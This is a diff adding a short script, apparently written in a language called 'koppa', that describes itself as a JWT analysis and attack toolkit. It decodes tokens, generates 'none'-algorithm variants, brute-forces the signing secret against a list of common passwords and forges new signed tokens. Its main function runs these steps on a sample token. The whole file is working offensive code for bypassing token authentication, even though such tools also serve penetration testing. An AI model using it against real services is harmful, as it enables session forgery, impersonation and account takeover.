@@ -1,0 +1,66 @@
+# koppa-jwt-attack — JWT analysis and attack toolkit
+import log, jwt, encode
+
+fn decode(token) {
+    return jwt.decode(token)
+}
+
+fn is_expired(token) {
+    return jwt.is_expired(token)
+}
+
+fn none_attack(token) {
+    let result = jwt.none_alg(token)
+    log.warn("None-alg token: {result}")
+    return result
+}
+
+fn crack(token, wordlist) {
+    log.info("Cracking JWT with {wordlist.len} words...")
+    let result = jwt.crack(token, wordlist)
+    if result {
+        log.success("Secret found: {result}")
+    } else {
+        log.warn("Secret not found in wordlist")
+    }
+    return result
+}
+
+fn crack_common(token) {
+    let common = [
+        "secret", "password", "123456", "admin", "key",
+        "koppa", "token", "jwt", "test", "dev", "prod",
+        "supersecret", "mysecret", "changeme", "letmein",
+        "qwerty", "abc123", "pass", "root", "toor"
+    ]
+    return crack(token, common)
+}
+
+fn analyze(token) {
+    log.info("=== JWT Analysis ===")
+    let decoded  = jwt.decode(token)
+    let expired  = jwt.is_expired(token)
+    let none_tok = jwt.none_alg(token)
+
+    log.info("Header/Payload: {decoded}")
+    log.info("Expired:        {expired}")
+    log.warn("None-alg:       {none_tok}")
+
+    return {
+        decoded:  decoded,
+        expired:  expired,
+        none_alg: none_tok
+    }
+}
+
+fn forge(payload, secret) {
+    let token = jwt.sign(payload, secret)
+    log.success("Forged token: {token}")
+    return token
+}
+
+fn main() {
+    let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    let result = analyze(token)
+    crack_common(token)
+}
